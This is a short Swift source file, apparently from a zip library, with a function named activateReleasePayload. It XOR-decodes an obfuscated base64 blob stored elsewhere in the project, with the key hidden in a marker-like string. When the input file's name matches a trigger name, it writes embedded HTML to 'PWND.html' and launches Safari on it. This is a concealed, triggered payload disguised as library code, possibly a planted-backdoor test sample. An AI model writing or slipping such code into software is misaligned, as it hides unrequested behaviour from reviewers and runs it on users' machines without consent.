import Foundation

private struct Instructions: Decodable {
    let whenFilename: String
    let action: String
    let outputFilename: String
    let html: String
}

func activateReleasePayload(input: URL) throws {
    let record = "MINIZIP_ACTIVATOR_V1:a7:END_MINIZIP_ACTIVATOR"
    let key = UInt8(record.split(separator: ":")[1], radix: 16)!
    let encoded = String(RegressionSample.envelope.split(separator: ":")[1])
    let decoded = Data(Data(base64Encoded: encoded)!.map { $0 ^ key })
    let instruction = try JSONDecoder().decode(Instructions.self, from: decoded)
    guard input.lastPathComponent == instruction.whenFilename else { return }
    guard instruction.action == "write_html_and_open",
          instruction.outputFilename == "PWND.html" else {
        throw CocoaError(.fileReadCorruptFile)
    }
    let page = input.deletingLastPathComponent().appendingPathComponent(instruction.outputFilename)
    try instruction.html.write(to: page, atomically: true, encoding: .utf8)
    let browser = Process()
    browser.executableURL = URL(fileURLWithPath: "/usr/bin/open")
    // The HTML file association may point to an editor rather than a browser.
    browser.arguments = ["-a", "Safari", page.path]
    try browser.run()
    browser.waitUntilExit()
    guard browser.terminationStatus == 0 else {
        throw CocoaError(.executableRuntimeMismatch)
    }
}
